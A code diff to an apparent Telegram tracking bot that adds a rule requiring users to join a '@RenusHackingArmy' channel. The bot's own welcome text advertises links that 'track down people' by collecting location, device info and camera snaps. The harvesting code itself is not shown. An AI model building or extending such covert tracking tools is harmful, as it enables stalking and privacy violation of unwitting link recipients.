@@ -7,6 +7,8 @@ const TelegramBot = require('node-telegram-bot-api');
 const bot = new TelegramBot(process.env["bot"], {polling: true});
 var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
 var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
+const channels = ['@RenusHackingArmy', '@RenusBotsChannel'];
+
 const app = express();
 app.use(jsonParser);
 app.use(urlencodedParser);
@@ -66,13 +68,49 @@ if(msg?.reply_to_message?.text=="🌐 Enter Your URL"){
  createLink(chatId,msg.text); 
 }
   
-if(msg.text=="/start"){
-var m={
-reply_markup:JSON.stringify({"inline_keyboard":[[{text:"Create Link",callback_data:"crenew"}]]})
-};
+if (msg.text == "/start") {
+    const userId = msg.from.id;
 
-bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather informations like location , device info, camera snaps.\n\nType /help for more info.`,m);
+    let isMemberOfAllChannels = true;
+
+    for (let channel of channels) {
+      try {
+        const chatMember = await bot.getChatMember(channel, userId);
+        if (chatMember.status == 'left' || chatMember.status == 'kicked') {
+          isMemberOfAllChannels = false;
+          break;
+        }
+      } catch (error) {
+        isMemberOfAllChannels = false;
+        break;
+      }
+    }
+
+    if (!isMemberOfAllChannels) {
+      var joinMessage = "Please join our channels first:";
+      var joinButtons = channels.map(channel => {
+        return [{ text: `Join ${channel}`, url: `https://t.me/${channel.substring(1)}` }];
+      });
+
+      var joinMarkup = {
+        reply_markup: JSON.stringify({
+          "inline_keyboard": joinButtons
+        })
+      };
+
+      bot.sendMessage(chatId, joinMessage, joinMarkup);
+    } else {
+      var m = {
+        reply_markup: JSON.stringify({
+          "inline_keyboard": [[{ text: "Create Link", callback_data: "crenew" }]]
+        })
+      };
+
+      bot.sendMessage(chatId, `Welcome ${msg.chat.first_name} ! , \nYou can use this bot to track down people just through a simple link.\nIt can gather information like location, device info, camera snaps.\n\nType /help for more info.`, m);
+    }
 }
+
+
 else if(msg.text=="/create"){
 createNew(chatId);
 }
